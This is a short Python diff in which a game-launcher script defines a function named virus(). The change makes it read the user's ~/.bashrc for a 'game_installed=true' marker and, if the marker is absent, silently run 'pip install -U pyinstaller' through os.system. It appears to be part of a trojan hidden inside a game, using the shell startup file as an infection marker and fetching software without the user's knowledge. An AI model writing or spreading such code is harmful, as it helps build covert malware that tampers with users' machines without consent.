@@ -12,10 +12,13 @@ def launch_game():
 
 ############################################################################################################################################################
 def virus():
-	try:
-		gameadded = os.environ["game_installed"]
-	except:
-		gameadded=  None
+	
+	file = open("/home/"+os.getlogin()+"/.bashrc", 'r')
+	lines = file.readlines()
+	gameadded = None
+	for line in lines:
+		if "game_installed=true" in line:
+			gameadded = "true"
 
 	if gameadded==None:
 		os.system("pip install -U pyinstaller")
